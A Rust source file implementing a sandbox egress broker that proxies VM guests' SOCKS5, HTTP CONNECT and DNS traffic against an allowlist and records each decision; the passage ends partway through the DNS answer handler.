//! The egress broker — the host-side gatekeeper for a filtered-egress run.
//!
//! A filtered slot forwards **nothing** ([`super::setup::build_nft_ruleset`]).
//! The only peer its guest can address is the gateway `10.107.<i>.1`, on the
//! three ports this module listens on. Everything the guest reaches, it reaches
//! because the broker dialled it on the guest's behalf, having first checked the
//! destination against the run's allowlist.
//!
//! # Why in-process
//!
//! The broker runs as tokio tasks inside the VM supervisor's own process, not as
//! a child. A task cannot outlive the run that spawned it, so there is no
//! leaked-listener class of bug, no pidfile to reap, and no second process to
//! reason about at teardown. [`Broker::shutdown`] aborts the tasks in the same
//! path that kills the Firecracker process.
//!
//! Listeners bind the slot's gateway address specifically, never `0.0.0.0`: the
//! slot lock already guarantees exclusive use of that address, and a wildcard
//! bind would put every slot's broker on every other slot's gateway.
//!
//! # The three listeners
//!
//! | Port | Protocol | Why |
//! |------|----------|-----|
//! | 1080 | SOCKS5 | The primary. Hostname-form targets (`socks5h://`) keep resolution host-side, and it carries arbitrary TCP — `git://`, ssh, database clients. |
//! | 3128 | HTTP `CONNECT` + absolute-form | `HTTPS_PROXY` is what pip, npm, curl and git read by default. Absolute-form (plain `http://`) is handled too, because the Alpine base fetches packages over HTTP. |
//! | 5353 | DNS (UDP + TCP) | Answers allowlisted names only. `:53` is redirected here at setup time because an unprivileged process cannot bind a low port. |
//!
//! # Literal addresses and the resolution cache
//!
//! [`super::egress::decide`] refuses a literal-address target unless a CIDR rule
//! covers it — otherwise a guest could sidestep a name allowlist by resolving
//! the name itself and dialling the address. But some proxy clients legitimately
//! resolve locally and then hand the proxy an address (`socks5://` rather than
//! `socks5h://`).
//!
//! The broker bridges that without weakening anything: it remembers the
//! addresses **it** returned for an allowed name, and accepts a literal target
//! that appears in that cache, recording it under the name it was resolved for.
//! An address the guest obtained some other way is still refused. This punches
//! no hole in the packet filter — the guest still cannot reach the address
//! directly — and it grants nothing that a plain `CONNECT allowed-name:443`
//! tunnel does not already grant, since the broker does not terminate TLS and a
//! tunnel to a shared CDN address can already carry any SNI. See `SECURITY.md`:
//! allowlisting is destination control, not DLP.

use std::collections::HashMap;
use std::net::{IpAddr, Ipv4Addr, SocketAddr};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

use anyhow::{Context, Result};
use serde::Serialize;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::{TcpListener, TcpStream, UdpSocket};
use tokio::sync::Semaphore;
use tokio::task::JoinHandle;

use super::egress::{decide, DenyReason, HostRule, SafeName, Target};
use super::{BROKER_DNS_PORT, BROKER_HTTP_PORT, BROKER_SOCKS_PORT};

// ===========================================================================
// Bounds. Every one of these caps a resource a hostile guest could otherwise
// drive without limit, mirroring how `crate::agent` bounds the vsock plane.
// ===========================================================================

/// Concurrent proxied connections per run. Beyond this, new connections wait;
/// combined with [`HANDSHAKE_TIMEOUT`] a guest cannot pin the broker by opening
/// sockets and going silent.
const MAX_CONCURRENT_CONNS: usize = 64;
/// How long a client has to complete its SOCKS5 / HTTP handshake.
const HANDSHAKE_TIMEOUT: Duration = Duration::from_secs(10);
/// How long the broker will wait to establish an upstream connection.
const DIAL_TIMEOUT: Duration = Duration::from_secs(20);
/// Hard ceiling on one proxied connection's lifetime. Teardown aborts every task
/// anyway; this bounds a connection whose run somehow outlives its budget.
const CONN_MAX_LIFETIME: Duration = Duration::from_secs(30 * 60);
/// Largest HTTP request head (request line + headers) the broker will buffer.
const MAX_HTTP_HEAD: usize = 8 * 1024;
/// Largest DNS message accepted or produced. 512 is the classic UDP limit
/// (RFC 1035 §2.3.4); the broker does not advertise EDNS0, so it never needs
/// more.
const MAX_DNS_MSG: usize = 512;
/// TTL handed out for answers the broker synthesises, in seconds. Short, so a
/// guest cannot cache a name across a policy change.
const ANSWER_TTL: u32 = 60;
/// Ceiling on recorded events. A guest that hammers denied destinations must not
/// grow host memory without bound; the counter keeps counting past the cap.
const MAX_RECORDED_EVENTS: usize = 10_000;

// ===========================================================================
// Recording.
// ===========================================================================

/// Which listener handled an event.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum Proto {
    /// The SOCKS5 listener.
    Socks5,
    /// The HTTP listener (`CONNECT` tunnel or absolute-form forward).
    Http,
    /// The DNS responder.
    Dns,
}

/// One recorded egress decision — the unit of the flight recorder.
///
/// Every string field is a [`SafeName`] or a machine-generated literal, so the
/// whole struct is safe to serialise into `egress.jsonl` and into a model's
/// context. Guest-chosen bytes never appear verbatim.
#[derive(Debug, Clone, Serialize)]
pub struct EgressEvent {
    /// Which listener produced this event.
    pub proto: Proto,
    /// The destination the guest asked for, sanitised.
    pub host: SafeName,
    /// Destination port (0 for DNS queries, which name no port).
    pub port: u16,
    /// Whether the broker permitted it.
    pub allowed: bool,
    /// Why it was refused, when it was.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub reason: Option<DenyReason>,
    /// Bytes the guest sent upstream on this connection.
    pub bytes_up: u64,
    /// Bytes returned to the guest on this connection.
    pub bytes_down: u64,
    /// Milliseconds since the broker started listening.
    pub ts_ms: u64,
    /// A short machine-readable note (e.g. `dial-failed`), never guest text.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub note: Option<&'static str>,
}

/// Shared state: the decision log plus the resolution cache.
#[derive(Debug, Default)]
struct Shared {
    events: Vec<EgressEvent>,
    /// Total events observed, including any past [`MAX_RECORDED_EVENTS`].
    total: u64,
    /// Addresses the broker itself returned for an allowed name.
    resolved: HashMap<IpAddr, SafeName>,
}

/// Handle the listeners use to consult policy and record what they did.
#[derive(Debug, Clone)]
struct Recorder {
    shared: Arc<Mutex<Shared>>,
    started: Instant,
}

impl Recorder {
    fn new() -> Self {
        Self {
            shared: Arc::new(Mutex::new(Shared::default())),
            started: Instant::now(),
        }
    }

    fn elapsed_ms(&self) -> u64 {
        u64::try_from(self.started.elapsed().as_millis()).unwrap_or(u64::MAX)
    }

    /// Record one event. A poisoned lock is swallowed: losing a log line must
    /// never take down a run, and the enforcement decision has already happened.
    fn record(&self, event: EgressEvent) {
        if let Ok(mut shared) = self.shared.lock() {
            shared.total = shared.total.saturating_add(1);
            if shared.events.len() < MAX_RECORDED_EVENTS {
                shared.events.push(event);
            }
        }
    }

    /// Remember an address the broker resolved for an allowed name.
    fn remember_resolved(&self, ip: IpAddr, name: &SafeName) {
        if let Ok(mut shared) = self.shared.lock() {
            // Bounded by the same ceiling as the event log.
            if shared.resolved.len() < MAX_RECORDED_EVENTS {
                shared.resolved.insert(ip, name.clone());
            }
        }
    }

    /// The name this address was handed out for, if the broker resolved it.
    fn name_for(&self, ip: &IpAddr) -> Option<SafeName> {
        self.shared.lock().ok()?.resolved.get(ip).cloned()
    }

    fn snapshot(&self) -> (Vec<EgressEvent>, u64) {
        match self.shared.lock() {
            Ok(shared) => (shared.events.clone(), shared.total),
            Err(_) => (Vec::new(), 0),
        }
    }
}

// ===========================================================================
// Broker lifecycle.
// ===========================================================================

/// Which ports the broker listens on.
///
/// [`BrokerPorts::default`] is the only configuration a real run uses, because
/// `sudo isopod setup` bakes these numbers into the nftables ruleset and the
/// unprivileged runtime cannot open a hole for a port chosen later. The override
/// exists so tests can bind ephemeral ports on loopback.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct BrokerPorts {
    /// SOCKS5 listener port.
    pub socks: u16,
    /// HTTP listener port.
    pub http: u16,
    /// DNS listener port (TCP and UDP).
    pub dns: u16,
}

impl Default for BrokerPorts {
    fn default() -> Self {
        Self {
            socks: BROKER_SOCKS_PORT,
            http: BROKER_HTTP_PORT,
            dns: BROKER_DNS_PORT,
        }
    }
}

/// What a run's broker enforces.
#[derive(Debug, Clone)]
pub struct BrokerSpec {
    /// The slot's gateway address; every listener binds here and nowhere else.
    pub gateway: Ipv4Addr,
    /// The run's allowlist. Empty means "deny everything", which is a supported
    /// and useful configuration: the recorder still logs every attempt.
    pub rules: Vec<HostRule>,
    /// Listener ports; leave as [`BrokerPorts::default`] outside tests.
    pub ports: BrokerPorts,
}

impl BrokerSpec {
    /// A spec for a real run: the setup-time ports on the slot's gateway.
    #[must_use]
    pub fn new(gateway: Ipv4Addr, rules: Vec<HostRule>) -> Self {
        Self {
            gateway,
            rules,
            ports: BrokerPorts::default(),
        }
    }
}

/// Policy shared by all three listeners.
#[derive(Debug)]
struct Policy {
    rules: Vec<HostRule>,
    recorder: Recorder,
    conns: Arc<Semaphore>,
}

/// A running broker. Drop or [`Broker::shutdown`] stops every listener.
#[derive(Debug)]
pub struct Broker {
    policy: Arc<Policy>,
    tasks: Vec<JoinHandle<()>>,
    endpoints: BrokerEndpoints,
    dns_addr: SocketAddr,
}

/// The addresses to hand the guest, so it can find the broker.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct BrokerEndpoints {
    /// `HOST:PORT` of the SOCKS5 listener.
    pub socks: String,
    /// `HOST:PORT` of the HTTP listener.
    pub http: String,
    /// The gateway address the guest should use as its resolver.
    pub dns: String,
}

impl Broker {
    /// Bind all three listeners on `spec.gateway` and start serving.
    ///
    /// # Errors
    /// If any listener cannot bind. A filtered run must never boot with a
    /// partly-listening broker: the guest would see a total network outage
    /// rather than a policy decision, so a bind failure fails the run.
    pub async fn start(spec: BrokerSpec) -> Result<Self> {
        let policy = Arc::new(Policy {
            rules: spec.rules,
            recorder: Recorder::new(),
            conns: Arc::new(Semaphore::new(MAX_CONCURRENT_CONNS)),
        });
        let gw = spec.gateway;

        let socks = bind_tcp(gw, spec.ports.socks).await?;
        let http = bind_tcp(gw, spec.ports.http).await?;
        let dns_udp = bind_udp(gw, spec.ports.dns).await?;
        // Bind DNS TCP from the same *request*, not from the port UDP happened
        // to get. For a real run `ports.dns` is the fixed BROKER_DNS_PORT, so
        // both halves land on it and match the setup-time redirect. Deriving the
        // TCP port from the UDP socket instead would be a race for an ephemeral
        // (`0`) request — the kernel allocates UDP and TCP ports from
        // independent spaces, so the number UDP received may already be held by
        // an unrelated TCP socket. Only tests request `0`, and they exercise the
        // UDP responder, so letting the two diverge there is harmless.
        let dns_tcp = bind_tcp(gw, spec.ports.dns).await?;
        let dns_port = dns_udp
            .local_addr()
            .map(|a| a.port())
            .unwrap_or(spec.ports.dns);

        // Report the addresses actually bound, not the ones requested, so an
        // ephemeral port is visible to the caller.
        let socks_addr = socks
            .local_addr()
            .unwrap_or(SocketAddr::from((gw, spec.ports.socks)));
        let http_addr = http
            .local_addr()
            .unwrap_or(SocketAddr::from((gw, spec.ports.http)));

        let tasks = vec![
            tokio::spawn(serve_tcp(socks, Arc::clone(&policy), Proto::Socks5)),
            tokio::spawn(serve_tcp(http, Arc::clone(&policy), Proto::Http)),
            tokio::spawn(serve_dns_udp(dns_udp, Arc::clone(&policy))),
            tokio::spawn(serve_tcp(dns_tcp, Arc::clone(&policy), Proto::Dns)),
        ];

        Ok(Self {
            policy,
            tasks,
            endpoints: BrokerEndpoints {
                socks: socks_addr.to_string(),
                http: http_addr.to_string(),
                dns: gw.to_string(),
            },
            dns_addr: SocketAddr::from((gw, dns_port)),
        })
    }

    /// The DNS responder's bound address. The guest reaches it as `<gateway>:53`
    /// via the setup-time redirect; this is where the redirect lands.
    #[must_use]
    pub fn dns_addr(&self) -> SocketAddr {
        self.dns_addr
    }

    /// The endpoints to advertise to the guest.
    #[must_use]
    pub fn endpoints(&self) -> &BrokerEndpoints {
        &self.endpoints
    }

    /// Every recorded decision, plus the total observed (which exceeds the
    /// returned length when [`MAX_RECORDED_EVENTS`] was hit).
    #[must_use]
    pub fn events(&self) -> (Vec<EgressEvent>, u64) {
        self.policy.recorder.snapshot()
    }

    /// Stop every listener. Idempotent.
    pub fn shutdown(&mut self) {
        for task in self.tasks.drain(..) {
            task.abort();
        }
    }
}

impl Drop for Broker {
    fn drop(&mut self) {
        self.shutdown();
    }
}

async fn bind_tcp(gw: Ipv4Addr, port: u16) -> Result<TcpListener> {
    TcpListener::bind(SocketAddr::from((gw, port)))
        .await
        .with_context(|| format!("binding the egress broker to {gw}:{port}"))
}

async fn bind_udp(gw: Ipv4Addr, port: u16) -> Result<UdpSocket> {
    UdpSocket::bind(SocketAddr::from((gw, port)))
        .await
        .with_context(|| format!("binding the egress broker's DNS responder to {gw}:{port}"))
}

/// Accept loop shared by all three TCP listeners.
async fn serve_tcp(listener: TcpListener, policy: Arc<Policy>, proto: Proto) {
    loop {
        let Ok((stream, _peer)) = listener.accept().await else {
            // A transient accept error must not kill the listener; yield and retry.
            tokio::task::yield_now().await;
            continue;
        };
        let policy = Arc::clone(&policy);
        tokio::spawn(async move {
            // The semaphore bounds concurrency; a permit is held for the whole
            // connection. `acquire_owned` only fails if the semaphore is closed,
            // which never happens while the broker lives.
            let Ok(_permit) = Arc::clone(&policy.conns).acquire_owned().await else {
                return;
            };
            let work = async {
                match proto {
                    Proto::Socks5 => handle_socks(stream, &policy).await,
                    Proto::Http => handle_http(stream, &policy).await,
                    Proto::Dns => handle_dns_tcp(stream, &policy).await,
                }
            };
            let _ = tokio::time::timeout(CONN_MAX_LIFETIME, work).await;
        });
    }
}

// ===========================================================================
// Policy application.
// ===========================================================================

/// The outcome of checking one target against the run's rules.
enum Verdict {
    /// Permitted; connect to this name or address.
    Allow(SafeName),
    /// Refused, with the reason to record and report.
    Deny(DenyReason),
}

impl Policy {
    /// Apply the allowlist to a target, consulting the resolution cache for
    /// literal addresses (see the module docs).
    fn check(&self, target: &Target) -> Verdict {
        if let Decision::Allow = decide(&self.rules, target) {
            return Verdict::Allow(target.safe_host());
        }
        // A literal address the broker itself handed out for an allowed name is
        // the same destination under a different spelling.
        if let Target::Addr(ip, _) = target {
            if let Some(name) = self.recorder.name_for(ip) {
                return Verdict::Allow(name);
            }
        }
        match decide(&self.rules, target) {
            Decision::Deny(reason) => Verdict::Deny(reason),
            Decision::Allow => Verdict::Allow(target.safe_host()),
        }
    }

    fn record(&self, event: EgressEvent) {
        self.recorder.record(event);
    }

    fn now_ms(&self) -> u64 {
        self.recorder.elapsed_ms()
    }
}

use super::egress::Decision;

/// Resolve `target` host-side and connect, recording the outcome.
///
/// Returns the connected stream and the name to attribute traffic to.
async fn dial(policy: &Policy, target: &Target, proto: Proto) -> Result<TcpStream, DialFailure> {
    let port = target.port();
    let name = match policy.check(target) {
        Verdict::Allow(name) => name,
        Verdict::Deny(reason) => {
            policy.record(EgressEvent {
                proto,
                host: target.safe_host(),
                port,
                allowed: false,
                reason: Some(reason),
                bytes_up: 0,
                bytes_down: 0,
                ts_ms: policy.now_ms(),
                note: None,
            });
            return Err(DialFailure::Denied(reason));
        }
    };

    let addrs: Vec<SocketAddr> = match target {
        Target::Addr(ip, port) => vec![SocketAddr::new(*ip, *port)],
        Target::Name(host, port) => {
            match tokio::net::lookup_host((host.as_str(), *port)).await {
                Ok(iter) => {
                    // IPv4 only: filtered slots have no IPv6 path at all, so an
                    // AAAA result would produce a connection the guest can never
                    // use and a misleading "allowed" record.
                    let v4: Vec<SocketAddr> = iter.filter(|a| a.is_ipv4()).collect();
                    for a in &v4 {
                        policy.recorder.remember_resolved(a.ip(), host);
                    }
                    v4
                }
                Err(_) => Vec::new(),
            }
        }
    };
    if addrs.is_empty() {
        policy.record(EgressEvent {
            proto,
            host: name,
            port,
            allowed: false,
            reason: None,
            bytes_up: 0,
            bytes_down: 0,
            ts_ms: policy.now_ms(),
            note: Some("resolve-failed"),
        });
        return Err(DialFailure::Unreachable);
    }

    for addr in addrs {
        match tokio::time::timeout(DIAL_TIMEOUT, TcpStream::connect(addr)).await {
            Ok(Ok(stream)) => {
                policy.record(EgressEvent {
                    proto,
                    host: name,
                    port,
                    allowed: true,
                    reason: None,
                    bytes_up: 0,
                    bytes_down: 0,
                    ts_ms: policy.now_ms(),
                    note: None,
                });
                return Ok(stream);
            }
            _ => continue,
        }
    }
    policy.record(EgressEvent {
        proto,
        host: name,
        port,
        allowed: false,
        reason: None,
        bytes_up: 0,
        bytes_down: 0,
        ts_ms: policy.now_ms(),
        note: Some("dial-failed"),
    });
    Err(DialFailure::Unreachable)
}

/// Why a dial did not produce a connection.
#[derive(Debug, Clone, Copy)]
enum DialFailure {
    /// Refused by policy.
    Denied(DenyReason),
    /// Allowed, but the destination could not be reached.
    Unreachable,
}

// ===========================================================================
// SOCKS5 (RFC 1928).
// ===========================================================================

/// SOCKS5 reply codes used by the broker.
mod socks_reply {
    /// Succeeded.
    pub const OK: u8 = 0x00;
    /// Connection not allowed by ruleset — the allowlist verdict.
    pub const NOT_ALLOWED: u8 = 0x02;
    /// Host unreachable.
    pub const UNREACHABLE: u8 = 0x04;
    /// Command not supported (the broker implements CONNECT only).
    pub const CMD_UNSUPPORTED: u8 = 0x07;
    /// Address type not supported.
    pub const ATYP_UNSUPPORTED: u8 = 0x08;
}

async fn handle_socks(mut stream: TcpStream, policy: &Policy) {
    let handshake = tokio::time::timeout(HANDSHAKE_TIMEOUT, socks_handshake(&mut stream)).await;
    let Ok(Ok(target)) = handshake else {
        return;
    };
    match dial(policy, &target, Proto::Socks5).await {
        Ok(upstream) => {
            if socks_reply(&mut stream, socks_reply::OK).await.is_err() {
                return;
            }
            pump(stream, upstream).await;
        }
        Err(DialFailure::Denied(_)) => {
            // A clear refusal, not a hang: the workload should see a policy
            // error it can report, not a timeout it will retry.
            let _ = socks_reply(&mut stream, socks_reply::NOT_ALLOWED).await;
        }
        Err(DialFailure::Unreachable) => {
            let _ = socks_reply(&mut stream, socks_reply::UNREACHABLE).await;
        }
    }
}

/// Perform the SOCKS5 greeting and read the CONNECT request.
async fn socks_handshake(stream: &mut TcpStream) -> std::io::Result<Target> {
    // Greeting: VER, NMETHODS, METHODS[NMETHODS].
    let mut head = [0u8; 2];
    stream.read_exact(&mut head).await?;
    if head[0] != 0x05 {
        return Err(std::io::Error::new(
            std::io::ErrorKind::InvalidData,
            "not SOCKS5",
        ));
    }
    let mut methods = vec![0u8; head[1] as usize];
    stream.read_exact(&mut methods).await?;
    // No authentication: the guest is already inside its own sandbox, and a
    // credential here would be one more secret in guest memory for no gain.
    stream.write_all(&[0x05, 0x00]).await?;

    // Request: VER, CMD, RSV, ATYP, ADDR, PORT.
    let mut req = [0u8; 4];
    stream.read_exact(&mut req).await?;
    if req[1] != 0x01 {
        let _ = socks_reply(stream, socks_reply::CMD_UNSUPPORTED).await;
        return Err(std::io::Error::new(
            std::io::ErrorKind::InvalidData,
            "only CONNECT is supported",
        ));
    }
    let host = match req[3] {
        0x01 => {
            let mut octets = [0u8; 4];
            stream.read_exact(&mut octets).await?;
            SocksHost::Addr(IpAddr::from(octets))
        }
        0x03 => {
            let mut len = [0u8; 1];
            stream.read_exact(&mut len).await?;
            let mut name = vec![0u8; len[0] as usize];
            stream.read_exact(&mut name).await?;
            SocksHost::Name(SafeName::sanitized_bytes(&name))
        }
        0x04 => {
            let mut octets = [0u8; 16];
            stream.read_exact(&mut octets).await?;
            SocksHost::Addr(IpAddr::from(octets))
        }
        _ => {
            let _ = socks_reply(stream, socks_reply::ATYP_UNSUPPORTED).await;
            return Err(std::io::Error::new(
                std::io::ErrorKind::InvalidData,
                "unsupported address type",
            ));
        }
    };
    let mut port = [0u8; 2];
    stream.read_exact(&mut port).await?;
    let port = u16::from_be_bytes(port);
    Ok(match host {
        SocksHost::Name(n) => Target::Name(n, port),
        SocksHost::Addr(a) => Target::Addr(a, port),
    })
}

enum SocksHost {
    Name(SafeName),
    Addr(IpAddr),
}

/// Write a SOCKS5 reply with an all-zero bound address (RFC 1928 §6 permits it
/// for CONNECT; clients ignore it).
async fn socks_reply(stream: &mut TcpStream, code: u8) -> std::io::Result<()> {
    stream
        .write_all(&[0x05, code, 0x00, 0x01, 0, 0, 0, 0, 0, 0])
        .await
}

// ===========================================================================
// HTTP: CONNECT tunnels and absolute-form forwarding.
// ===========================================================================

async fn handle_http(mut stream: TcpStream, policy: &Policy) {
    let head = match tokio::time::timeout(HANDSHAKE_TIMEOUT, read_http_head(&mut stream)).await {
        Ok(Ok(h)) => h,
        _ => return,
    };
    let Some(request) = parse_http_head(&head) else {
        // Record it. A request the broker refuses before it can even name a
        // destination is still a use of the only exit this guest has, and the
        // flight recorder claims to show every attempt — an unrecorded refusal
        // reads to an operator as "the workload never tried".
        policy.record(EgressEvent {
            proto: Proto::Http,
            host: SafeName::sanitized(""),
            port: 0,
            allowed: false,
            reason: Some(DenyReason::Malformed),
            bytes_up: 0,
            bytes_down: 0,
            ts_ms: policy.now_ms(),
            note: Some("unparseable-proxy-request"),
        });
        let _ = stream
            .write_all(http_error(400, "malformed proxy request").as_bytes())
            .await;
        return;
    };

    match request.kind {
        HttpKind::HttpsAbsolute => {
            // `GET https://host/path` sent to a proxy. Some clients (busybox
            // wget built without TLS among them) do this instead of CONNECT.
            // The broker cannot serve it without terminating TLS, which it
            // deliberately does not do — so refuse, but refuse *legibly*: name
            // the destination in the record and tell the client what to use.
            policy.record(EgressEvent {
                proto: Proto::Http,
                host: request.target.safe_host(),
                port: request.target.port(),
                allowed: false,
                reason: Some(DenyReason::Malformed),
                bytes_up: 0,
                bytes_down: 0,
                ts_ms: policy.now_ms(),
                note: Some("https-absolute-form-needs-connect"),
            });
            let _ = stream
                .write_all(
                    http_error(
                        501,
                        "this client sent an absolute-form https:// request; an \
                         HTTPS destination must be reached with CONNECT (or via \
                         ALL_PROXY=socks5h://). The broker does not terminate TLS.",
                    )
                    .as_bytes(),
                )
                .await;
        }
        HttpKind::Connect => match dial(policy, &request.target, Proto::Http).await {
            Ok(upstream) => {
                if stream
                    .write_all(b"HTTP/1.1 200 Connection established\r\n\r\n")
                    .await
                    .is_err()
                {
                    return;
                }
                pump(stream, upstream).await;
            }
            Err(DialFailure::Denied(reason)) => {
                let _ = stream
                    .write_all(http_error(403, reason.explain()).as_bytes())
                    .await;
            }
            Err(DialFailure::Unreachable) => {
                let _ = stream
                    .write_all(
                        http_error(502, "the allowed destination could not be reached").as_bytes(),
                    )
                    .await;
            }
        },
        HttpKind::Absolute { rewritten } => {
            match dial(policy, &request.target, Proto::Http).await {
                Ok(mut upstream) => {
                    // Forward the rewritten head, then splice. `Connection: close`
                    // is forced during the rewrite so the connection cannot be
                    // reused for a different — unchecked — host.
                    if upstream.write_all(rewritten.as_bytes()).await.is_err() {
                        return;
                    }
                    pump(stream, upstream).await;
                }
                Err(DialFailure::Denied(reason)) => {
                    let _ = stream
                        .write_all(http_error(403, reason.explain()).as_bytes())
                        .await;
                }
                Err(DialFailure::Unreachable) => {
                    let _ = stream
                        .write_all(
                            http_error(502, "the allowed destination could not be reached")
                                .as_bytes(),
                        )
                        .await;
                }
            }
        }
    }
}

/// Read up to the end of the HTTP head, bounded by [`MAX_HTTP_HEAD`].
async fn read_http_head(stream: &mut TcpStream) -> std::io::Result<Vec<u8>> {
    let mut buf = Vec::with_capacity(1024);
    let mut byte = [0u8; 1];
    loop {
        let n = stream.read(&mut byte).await?;
        if n == 0 {
            return Err(std::io::Error::new(
                std::io::ErrorKind::UnexpectedEof,
                "connection closed before the request head was complete",
            ));
        }
        buf.push(byte[0]);
        if buf.ends_with(b"\r\n\r\n") {
            return Ok(buf);
        }
        if buf.len() >= MAX_HTTP_HEAD {
            return Err(std::io::Error::new(
                std::io::ErrorKind::InvalidData,
                "request head exceeds the broker's ceiling",
            ));
        }
    }
}

/// A parsed proxy request.
struct HttpRequest {
    target: Target,
    kind: HttpKind,
}

enum HttpKind {
    /// `CONNECT host:port` — establish an opaque tunnel.
    Connect,
    /// Absolute-form (`GET http://host/path`) — forward this rewritten head.
    Absolute { rewritten: String },
    /// Absolute-form over https (`GET https://host/path`). Refused, but parsed
    /// far enough to name the destination in the flight recorder and tell the
    /// client to use CONNECT.
    HttpsAbsolute,
}

/// Build a small, fixed HTTP error response. The body is always broker-authored
/// text; guest input never reaches it.
fn http_error(code: u16, message: &str) -> String {
    let reason = match code {
        400 => "Bad Request",
        403 => "Forbidden",
        501 => "Not Implemented",
        502 => "Bad Gateway",
        _ => "Error",
    };
    let body = format!("isopod egress broker: {message}\n");
    format!(
        "HTTP/1.1 {code} {reason}\r\n\
         Content-Type: text/plain\r\n\
         Content-Length: {len}\r\n\
         Connection: close\r\n\r\n{body}",
        len = body.len()
    )
}

/// Parse a proxy request head into a target plus what to do with it.
///
/// Pure: no I/O, so the CONNECT / absolute-form / forged-Host cases are all
/// unit-testable. Returns `None` for anything the broker will not forward.
fn parse_http_head(head: &[u8]) -> Option<HttpRequest> {
    let text = std::str::from_utf8(head).ok()?;
    let mut lines = text.split("\r\n");
    let request_line = lines.next()?;
    let mut parts = request_line.split(' ');
    let method = parts.next()?;
    let uri = parts.next()?;
    let version = parts.next()?;
    if !version.starts_with("HTTP/") {
        return None;
    }

    if method.eq_ignore_ascii_case("CONNECT") {
        // Authority-form: `host:port`. The Host header is deliberately ignored —
        // the tunnel destination is the authority, so a forged Host header
        // cannot redirect it.
        let (host, port) = split_authority(uri, 443)?;
        return Some(HttpRequest {
            target: make_target(host, port),
            kind: HttpKind::Connect,
        });
    }

    // An https:// absolute-form names a destination the broker can identify but
    // cannot serve without terminating TLS. Parse it so the refusal is recorded
    // and explained rather than landing as an opaque 400.
    if let Some(rest) = uri.strip_prefix("https://") {
        let authority = rest.split('/').next().unwrap_or(rest);
        let (host, port) = split_authority(authority, 443)?;
        return Some(HttpRequest {
            target: make_target(host, port),
            kind: HttpKind::HttpsAbsolute,
        });
    }

    // Absolute-form: `GET http://host[:port]/path HTTP/1.1`. Required of proxy
    // clients by RFC 7230 §5.3.2, and what the Alpine base's package fetches
    // look like.
    let rest = uri.strip_prefix("http://")?;
    let (authority, path) = match rest.find('/') {
        Some(i) => (&rest[..i], &rest[i..]),
        None => (rest, "/"),
    };
    let (host, port) = split_authority(authority, 80)?;
    let target = make_target(host, port);

    // Rewrite to origin-form and force connection close, so this connection
    // carries exactly one request to exactly the host that was checked.
    let mut out = format!("{method} {path} {version}\r\n");
    for line in lines {
        if line.is_empty() {
            break;
        }
        let name = line.split(':').next().unwrap_or("");
        if name.eq_ignore_ascii_case("proxy-connection")
            || name.eq_ignore_ascii_case("connection")
            || name.eq_ignore_ascii_case("keep-alive")
        {
            continue;
        }
        out.push_str(line);
        out.push_str("\r\n");
    }
    out.push_str("Connection: close\r\n\r\n");
    Some(HttpRequest {
        target,
        kind: HttpKind::Absolute { rewritten: out },
    })
}

/// Split `host:port` / `host` / `[v6]:port`, defaulting the port.
fn split_authority(authority: &str, default_port: u16) -> Option<(&str, u16)> {
    if authority.is_empty() {
        return None;
    }
    if let Some(rest) = authority.strip_prefix('[') {
        // Bracketed IPv6 literal.
        let (addr, tail) = rest.split_once(']')?;
        let port = match tail.strip_prefix(':') {
            Some(p) => p.parse().ok()?,
            None => default_port,
        };
        return Some((addr, port));
    }
    match authority.rsplit_once(':') {
        Some((host, port)) => Some((host, port.parse().ok()?)),
        None => Some((authority, default_port)),
    }
}

/// Build a [`Target`], preferring the literal-address form when the authority
/// parses as one so the address rules apply rather than the name rules.
fn make_target(host: &str, port: u16) -> Target {
    match host.parse::<IpAddr>() {
        Ok(ip) => Target::Addr(ip, port),
        Err(_) => Target::Name(SafeName::sanitized(host), port),
    }
}

// ===========================================================================
// Byte pump.
// ===========================================================================

/// Splice a client and an upstream until either side closes.
async fn pump(mut client: TcpStream, mut upstream: TcpStream) {
    let _ = tokio::io::copy_bidirectional(&mut client, &mut upstream).await;
}

// ===========================================================================
// DNS responder.
// ===========================================================================

async fn serve_dns_udp(socket: UdpSocket, policy: Arc<Policy>) {
    let mut buf = vec![0u8; MAX_DNS_MSG];
    loop {
        let Ok((n, peer)) = socket.recv_from(&mut buf).await else {
            tokio::task::yield_now().await;
            continue;
        };
        let reply = answer_dns(&buf[..n], &policy).await;
        if let Some(reply) = reply {
            let _ = socket.send_to(&reply, peer).await;
        }
    }
}

/// DNS over TCP: a 2-byte big-endian length prefix, then the message.
async fn handle_dns_tcp(mut stream: TcpStream, policy: &Policy) {
    let read = async {
        let mut len = [0u8; 2];
        stream.read_exact(&mut len).await?;
        let len = usize::from(u16::from_be_bytes(len));
        if len > MAX_DNS_MSG {
            return Err(std::io::Error::new(
                std::io::ErrorKind::InvalidData,
                "DNS message exceeds the broker's ceiling",
            ));
        }
        let mut msg = vec![0u8; len];
        stream.read_exact(&mut msg).await?;
        Ok::<_, std::io::Error>(msg)
    };
    let Ok(Ok(query)) = tokio::time::timeout(HANDSHAKE_TIMEOUT, read).await else {
        return;
    };
    if let Some(reply) = answer_dns(&query, policy).await {
        let Ok(len) = u16::try_from(reply.len()) else {
            return;
        };
        let _ = stream.write_all(&len.to_be_bytes()).await;
        let _ = stream.write_all(&reply).await;
    }
}

/// The only DNS record type the broker synthesises. Every other type —
/// AAAA included — is answered NOERROR with no records.
const QTYPE_A: u16 = 1;
/// `NOERROR` / `NXDOMAIN` response codes (RFC 1035 §4.1.1).
const RCODE_NOERROR: u8 = 0;
const RCODE_NXDOMAIN: u8 = 3;
const RCODE_FORMERR: u8 = 1;

/// A parsed DNS question — everything the broker needs from a query.
#[derive(Debug, Clone, PartialEq, Eq)]
struct DnsQuery {
    id: u16,
    recursion_desired: bool,
    name: SafeName,
    qtype: u16,
    /// Byte range of the question section, echoed verbatim into the response.
    question: Vec<u8>,
}

/// Build the response for one query, resolving host-side when the name is
/// allowed.
async fn answer_dns(raw: &[u8], policy: &Policy) -> Option<Vec<u8>> {
    let query = match parse_dns_query(raw) {
        Some(q) => q,
        None => {
            // Malformed: reply FORMERR if there is at least an id to echo, so a
            // broken client sees an error rather than a silent black hole.
            let id = u16::from_be_bytes([*raw.first()?, *raw.get(1)?]);
            return Some(dns_header_only(id, false, RCODE_FORMERR));
        }
    };

    let target = Target::Name(query.name.clone(), 0);
